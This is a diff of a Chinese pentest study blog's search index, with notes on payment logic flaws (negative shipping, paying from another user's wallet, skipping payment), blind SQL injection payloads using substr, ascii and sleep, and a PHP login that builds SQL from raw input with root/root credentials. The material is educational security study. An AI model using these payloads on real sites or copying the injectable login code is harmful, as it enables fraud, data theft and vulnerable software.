+<h3 id="修改运费支付漏洞"><a href="#修改运费支付漏洞" class="headerlink" title="修改运费支付漏洞"></a>修改运费支付漏洞</h3><p><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-079085</code><br>也可以改成负数,总额=商品价格+运费,近乎白嫖</p>
+<h2 id="5-越权支付"><a href="#5-越权支付" class="headerlink" title="5.越权支付"></a>5.越权支付</h2><p>主要针对有余额的平台,属于越权漏洞,但也算是个支付漏洞吧<br>存在user=id(123),这种传参时，尝试改改id,尝试用别人的钱包买自己的包包。</p>
+<h2 id="6-跳过支付环节"><a href="#6-跳过支付环节" class="headerlink" title="6.跳过支付环节"></a>6.跳过支付环节</h2><p>抓包找到支付成功访问的页面，然后直接下个单子，复制订单号，然后拼接成功访问的页面<br><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0108184</code><br><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0188155</code></p>
+<h1 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h1><h2 id="数据加密-有用-但不多"><a href="#数据加密-有用-但不多" class="headerlink" title="数据加密(有用,但不多)"></a>数据加密(有用,但不多)</h2><p>1.加密可能被解密<br>2.加密的数据也可以被复用<br>3.数据包中的加密是在前端加密的,因此会js的都能知道加密方法(因为抓包的时候就已经被加密了,请求还没发给服务器,因此一定是前端加密的)</p>
+<h2 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h2><p>商品和钱的传参应该查询数据库做校验</p>
+<h1 id="如何挖掘"><a href="#如何挖掘" class="headerlink" title="如何挖掘"></a>如何挖掘</h1><h2 id="找到关键的数据包"><a href="#找到关键的数据包" class="headerlink" title="找到关键的数据包"></a>找到关键的数据包</h2><p>​    可能一个支付操作有三四个数据包，我们要对数据包进行挑选。</p>
+<h2 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h2><p>​    支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠），要尝试对数据包中的各个参数进行分析。</p>
+<h2 id="不按套路出牌"><a href="#不按套路出牌" class="headerlink" title="不按套路出牌"></a>不按套路出牌</h2><p>​    多去想想开发者没有想到的地方, pc端，wap端也看看，app也试试。</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>逻辑漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1410,6 +1378,38 @@
       </tags>
   </entry>
   <entry>
+    <title>盲注</title>
+    <url>/2023/08/21/%E7%9B%B2%E6%B3%A8/</url>
+    <content><![CDATA[<h1 id="1-盲注的定义"><a href="#1-盲注的定义" class="headerlink" title="1.盲注的定义"></a>1.盲注的定义</h1><p>所谓的盲注就是在服务器没有错误回显的时候完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”</p>
+<p>没有回显的注入都可以使用盲注的做法:</p>
+<p>=&gt;联合查询没有输出点,union不能用,猜不出字段</p>
+<p>=&gt;报错注入无法使用[函数被禁,报错被关闭]</p>
+<p>注意:盲注很繁琐,适合于工具</p>
+<h1 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h1><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><p>页面还是有反应的,查到数据的时候页面是正常的，查不到的时候页面是错误,即布尔盲注拥有很明显的true和false但是没有报错信息.</p>
+<h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>select *from news where id=1 and database()=’’,如果是纯粹猜测,要猜到天荒地老.所以人们研究出来切割法,一位一位的分割出来,大大降低爆破难度</p>
+<h3 id="如何分割"><a href="#如何分割" class="headerlink" title="如何分割?"></a>如何分割?</h3><h4 id="1、判断目标有多长"><a href="#1、判断目标有多长" class="headerlink" title="1、判断目标有多长"></a>1、判断目标有多长</h4><p>length() 判断字符串长度</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">12</span> <span class="comment">-- qwe</span></span><br><span class="line">这就知道了库的长度</span><br></pre></td></tr></table></figure>
+<h4 id="2、开切"><a href="#2、开切" class="headerlink" title="2、开切"></a>2、开切</h4><p>需要一个sql函数, </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr(切什么,从哪里开始切,切多长)</span><br><span class="line">	<span class="keyword">select</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="3、数字可以比较：599-gt-399"><a href="#3、数字可以比较：599-gt-399" class="headerlink" title="3、数字可以比较：599&gt;399"></a>3、数字可以比较：599&gt;399</h4><h4 id="4-字符串也可以比较"><a href="#4-字符串也可以比较" class="headerlink" title="4.字符串也可以比较"></a>4.字符串也可以比较</h4><p>如果可以比较字符，那就不需要一个一个试了，直接找区间</p>
+<p>此时引入ASCII编码,sql函数为:   ascii(你想转化的字符)</p>
+<h4 id="5-找库名表名字段名"><a href="#5-找库名表名字段名" class="headerlink" title="5.找库名表名字段名"></a>5.找库名表名字段名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">32</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line">&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 -- qwe&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="6-得到结果的ASCII码值-进行转码即可"><a href="#6-得到结果的ASCII码值-进行转码即可" class="headerlink" title="6.得到结果的ASCII码值,进行转码即可"></a>6.得到结果的ASCII码值,进行转码即可</h4><p>可以使用char()函数,不需要找ASCII表对照</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">char</span>(<span class="number">107</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">119</span>,<span class="number">111</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">120</span>,<span class="number">105</span>,<span class="number">97</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="3-时间盲注"><a href="#3-时间盲注" class="headerlink" title="3.时间盲注"></a>3.时间盲注</h1><h2 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a>适用场景</h2><p>无论做什么页面都一样,无论传参怎样,只返回一个true,页面都是正常的</p>
+<h2 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h2><p>通过传入延时函数来查看web页面返回是否延时来判断是否存在注入,同时利用if语句进行判断数据的正确与否</p>
+<h3 id="如何延时"><a href="#如何延时" class="headerlink" title="如何延时?"></a>如何延时?</h3><h4 id="1-延时函数"><a href="#1-延时函数" class="headerlink" title="1.延时函数"></a>1.延时函数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot; and sleep(10) -- qwe</span><br></pre></td></tr></table></figure>
+<h4 id="1-if-expr1-expr2-expr3"><a href="#1-if-expr1-expr2-expr3" class="headerlink" title="1.if(expr1,expr2,expr3)"></a>1.if(expr1,expr2,expr3)</h4><p>判断语句 如果第一个语句正确就执行第二个语句;如果错误执行第三个语句,即 if(条件，成立的时候XXX，不成立的时候XXX)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(length(database())<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">120</span>,sleep(<span class="number">10</span>),<span class="number">0</span>)<span class="comment">-- qwe</span></span><br><span class="line"></span><br><span class="line"># 其余步骤和布尔盲注一样,只是根据延时与否判断是否为真</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>自动化漏扫xray</title>
     <url>/2023/08/21/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%89%ABxray/</url>
     <content><![CDATA[<h1 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h1><p>自动化检测漏洞的工具 :AWVS | Xray | Nessus | appscan | Goby</p>
@@ -1432,6 +1432,38 @@
       <tags>
         <tag>渗透工具</tag>
         <tag>扫描</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>表单验证基础</title>
+    <url>/2023/08/21/%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="表单验证基础"><a href="#表单验证基础" class="headerlink" title="表单验证基础"></a>表单验证基础</h1><h2 id="表单组成"><a href="#表单组成" class="headerlink" title="表单组成"></a>表单组成</h2><h3 id="表单标签："><a href="#表单标签：" class="headerlink" title="表单标签："></a>表单标签：</h3><p>告诉别人我这里是一个表单[数据该传到那里、该用什么方式]     </p>
+<form action="1.html" method="get">
+
+
+        <form>
+            action 数据传到那里
+            method 改用什么方式串(GET / POST)
+        </form>
+
+
+<p>​<br>​        eg:   <form action="1.html" method="get"></p>
+<h4 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h4><h5 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h5><p>传参速度更快，但是会在网址(URL)中显示 问号之后 长度限制</p>
+<h5 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h5><p>没有长度限制、数据不会在URL显示</p>
+<h3 id="表单域："><a href="#表单域：" class="headerlink" title="表单域："></a>表单域：</h3><p>形形色色的框     </p>
+<h3 id="表单按钮："><a href="#表单按钮：" class="headerlink" title="表单按钮："></a>表单按钮：</h3><p>告诉别人我填完了</p>
+<h2 id="表单验证包含-PHP-数据库-前端"><a href="#表单验证包含-PHP-数据库-前端" class="headerlink" title="表单验证包含:PHP + 数据库 + 前端"></a>表单验证包含:PHP + 数据库 + 前端</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;index.php&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;input type=&#x27;text&#x27; name=&#x27;username&#x27;/&gt;</span><br><span class="line">&lt;input type=&#x27;password&#x27; name=&#x27;password&#x27;/&gt;</span><br><span class="line">&lt;input type=&#x27;Submit&#x27; value=&quot;登录&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">//$_GET 获取GET传参</span><br><span class="line">//$_POST 获取POST传参</span><br><span class="line">//$_REQUEST 获取GET和POST传参  【他是一个数组，通过选中键值的方式选中】</span><br><span class="line"></span><br><span class="line">$username =  $_REQUEST[&#x27;username&#x27;]; //获取登陆用户名</span><br><span class="line">$password = $_REQUEST[&#x27;password&#x27;];   //获取登陆密码</span><br><span class="line">//去数据库验证用户输入的账号密码是否正确</span><br><span class="line">$conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;20230209&#x27;);//我要和数据库进行链接  mysqli_connect(地址,账户，密码，库名）</span><br><span class="line">$sql = &quot;select *from admin where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">//$sql = &#x27;select*from admin where username=&quot;&#x27;.$username.&#x27;&quot;and password =&quot;&#x27;.$password.&#x27;&quot;&#x27;;</span><br><span class="line">$a = mysqli_query($conn,$sql); //得到的结果是个对象。未来会说  数组</span><br><span class="line">$result = mysqli_fetch_array($a);  // 能用中文写代码的语言只有一个 易语言 </span><br><span class="line">if($username == $result[&quot;username&quot;] and $username != &#x27;&#x27;)&#123;</span><br><span class="line">	echo &quot;登录成功&quot;;</span><br><span class="line">&#125;else&#123;echo &quot;登录失败，账号密码错误&quot;;&#125;</span><br><span class="line">//执行数据库语句</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h3><p>(1)PHP文件一定要放在网站根目录(一般来说在phpstudy里的WWW)，而且后缀名正常的情况下必须是PHP </p>
+<p>(2)可以混写，可以写PHP也可以写HTML  </p>
+<p>(3)&lt;?php PHP内容   ?&gt;<br>    <meta charset='UTF-8'><br>    HTML代码，指定了编码格式</p>
+<h3 id="2-数据库"><a href="#2-数据库" class="headerlink" title="2.数据库"></a>2.数据库</h3><p>​            库：多个表在一起就是库<br>​            表：xls表格<br>​            字段：列 表头<br>​            数据（行）：最终的内容。密码是123456</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>html</tag>
+        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -1489,38 +1521,6 @@
       </categories>
       <tags>
         <tag>逻辑漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>表单验证基础</title>
-    <url>/2023/08/21/%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<h1 id="表单验证基础"><a href="#表单验证基础" class="headerlink" title="表单验证基础"></a>表单验证基础</h1><h2 id="表单组成"><a href="#表单组成" class="headerlink" title="表单组成"></a>表单组成</h2><h3 id="表单标签："><a href="#表单标签：" class="headerlink" title="表单标签："></a>表单标签：</h3><p>告诉别人我这里是一个表单[数据该传到那里、该用什么方式]     </p>
-<form action="1.html" method="get">
-
-
-        <form>
-            action 数据传到那里
-            method 改用什么方式串(GET / POST)
-        </form>
-
-
-<p>​<br>​        eg:   <form action="1.html" method="get"></p>
-<h4 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h4><h5 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h5><p>传参速度更快，但是会在网址(URL)中显示 问号之后 长度限制</p>
-<h5 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h5><p>没有长度限制、数据不会在URL显示</p>
-<h3 id="表单域："><a href="#表单域：" class="headerlink" title="表单域："></a>表单域：</h3><p>形形色色的框     </p>
-<h3 id="表单按钮："><a href="#表单按钮：" class="headerlink" title="表单按钮："></a>表单按钮：</h3><p>告诉别人我填完了</p>
-<h2 id="表单验证包含-PHP-数据库-前端"><a href="#表单验证包含-PHP-数据库-前端" class="headerlink" title="表单验证包含:PHP + 数据库 + 前端"></a>表单验证包含:PHP + 数据库 + 前端</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;index.php&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;input type=&#x27;text&#x27; name=&#x27;username&#x27;/&gt;</span><br><span class="line">&lt;input type=&#x27;password&#x27; name=&#x27;password&#x27;/&gt;</span><br><span class="line">&lt;input type=&#x27;Submit&#x27; value=&quot;登录&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">//$_GET 获取GET传参</span><br><span class="line">//$_POST 获取POST传参</span><br><span class="line">//$_REQUEST 获取GET和POST传参  【他是一个数组，通过选中键值的方式选中】</span><br><span class="line"></span><br><span class="line">$username =  $_REQUEST[&#x27;username&#x27;]; //获取登陆用户名</span><br><span class="line">$password = $_REQUEST[&#x27;password&#x27;];   //获取登陆密码</span><br><span class="line">//去数据库验证用户输入的账号密码是否正确</span><br><span class="line">$conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;20230209&#x27;);//我要和数据库进行链接  mysqli_connect(地址,账户，密码，库名）</span><br><span class="line">$sql = &quot;select *from admin where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">//$sql = &#x27;select*from admin where username=&quot;&#x27;.$username.&#x27;&quot;and password =&quot;&#x27;.$password.&#x27;&quot;&#x27;;</span><br><span class="line">$a = mysqli_query($conn,$sql); //得到的结果是个对象。未来会说  数组</span><br><span class="line">$result = mysqli_fetch_array($a);  // 能用中文写代码的语言只有一个 易语言 </span><br><span class="line">if($username == $result[&quot;username&quot;] and $username != &#x27;&#x27;)&#123;</span><br><span class="line">	echo &quot;登录成功&quot;;</span><br><span class="line">&#125;else&#123;echo &quot;登录失败，账号密码错误&quot;;&#125;</span><br><span class="line">//执行数据库语句</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h3><p>(1)PHP文件一定要放在网站根目录(一般来说在phpstudy里的WWW)，而且后缀名正常的情况下必须是PHP </p>
-<p>(2)可以混写，可以写PHP也可以写HTML  </p>
-<p>(3)&lt;?php PHP内容   ?&gt;<br>    <meta charset='UTF-8'><br>    HTML代码，指定了编码格式</p>
-<h3 id="2-数据库"><a href="#2-数据库" class="headerlink" title="2.数据库"></a>2.数据库</h3><p>​            库：多个表在一起就是库<br>​            表：xls表格<br>​            字段：列 表头<br>​            数据（行）：最终的内容。密码是123456</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>html</tag>
-        <tag>php</tag>
       </tags>
   </entry>
   <entry>
